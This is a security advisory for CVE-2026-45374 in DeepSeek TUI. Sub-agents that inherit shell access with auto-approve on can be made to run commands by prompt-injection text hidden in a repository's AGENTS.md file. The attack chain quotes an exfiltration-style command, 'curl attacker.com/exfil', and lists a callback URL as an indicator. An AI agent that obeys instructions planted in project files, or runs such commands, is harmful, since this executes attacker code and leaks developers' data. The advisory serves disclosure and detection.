---
title: DeepSeek TUI RCE via Prompt Injection in Project Files
slug: 2026-05-deepseek-tui-rce
description: DeepSeek TUI versions before 0.8.26 are vulnerable to remote code execution via prompt injection due to insecure defaults in the `task_create` tool, spawning sub-agents that inherit `allow_shell` and `auto_approve` defaulting to true, which allows an attacker to inject malicious commands into project files that are then executed by the sub-agent without further approval from the user.
date: "2026-05-14T20:36:06Z"
type: advisory
types:
  - advisory
severities:
  - critical
tags:
  - rce
  - prompt-injection
  - deepseek-tui
  - cve-2026-45374
vendors:
  - rust
products:
  - deepseek-tui (< 0.8.26)
mitre_ttps:
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1203
    technique_name: Exploitation for Client Execution
references:
  - https://github.com/advisories/GHSA-72w5-pf8h-xfp4
  - CVE-2026-45374
iocs:
  - type: url
    value: http://[collaborator]/badge-gen?project=web-service
ioc_counts:
  url: 1
rules:
  - title: Detect Suspicious AGENTS.md modifications
    description: Detects modification to AGENTS.md files containing suspicious shell command patterns.
    platform: sigma
    severity: medium
    tactics:
      - initial_access
    techniques:
      - T1203
    data_sources:
      - file_event
      - linux
  - title: Detect Outbound Connections to Unusual Badge Generation URLs
    description: Detects network connections to URLs matching the badge generation pattern used in the exploit.
    platform: sigma
    severity: high
    tactics:
      - command_and_control
    techniques:
      - T1071.001
    data_sources:
      - network_connection
      - linux
rules_count: 2
---

DeepSeek TUI versions before 0.8.26 are susceptible to a remote code execution (RCE) vulnerability stemming from insecure default settings within the `task_create` tool. The vulnerability, identified as CVE-2026-45374, arises because the `task_create` tool spawns durable sub-agents with `allow_shell` and `auto_approve` both defaulting to `true`. This allows an attacker to inject malicious commands into project files, disguised as seemingly benign project conventions, which are then executed by the sub-agent without any further approval from the user. A developer cloning a malicious repository and opening it in DeepSeek-TUI is enough to trigger the vulnerability.

## Attack Chain

1. An attacker creates a malicious repository containing a `src/lib.rs` file with legitimate code and an `AGENTS.md` file containing prompt injection disguised as project workflow.
2. A developer clones the malicious repository and opens it in DeepSeek-TUI.
3. The developer initiates a task using `task_create` with a prompt such as "fix the TODOs in src/lib.rs and write a README.md".
4. The user approves the task creation, unaware of the implicit shell access granted to the sub-agent.
5. A sub-agent spawns with `allow_shell=true` and `auto_approve=true` due to the insecure defaults.
6. The sub-agent reads the `AGENTS.md` file from its system prompt, which contains attacker-controlled instructions disguised as project conventions.
7. The sub-agent follows the injected instructions and executes shell commands, such as `curl attacker.com/exfil`, without further approval prompts.
8. The attacker receives a callback, confirming remote code execution.

## Impact

Successful exploitation of this vulnerability allows an attacker to execute arbitrary commands on the developer's machine. The vulnerability stems from the user approving task creation but implicitly granting unrestricted shell access to a sub-agent that executes attacker-controlled instructions. This crosses the approval security boundary, potentially leading to sensitive data exfiltration, system compromise, or further lateral movement within the network.

## Recommendation

*   Upgrade to DeepSeek TUI version 0.8.26 or later to patch CVE-2026-45374.
*   As a workaround, manually review and sanitize any `AGENTS.md` files in repositories before opening them in DeepSeek TUI.
*   Implement network monitoring to detect outbound connections to suspicious URLs like `http://[collaborator]/badge-gen?project=web-service` as listed in the IOC table.
*   Deploy the Sigma rules in this brief to your SIEM and tune for your environment to detect malicious command execution and suspicious file modifications.
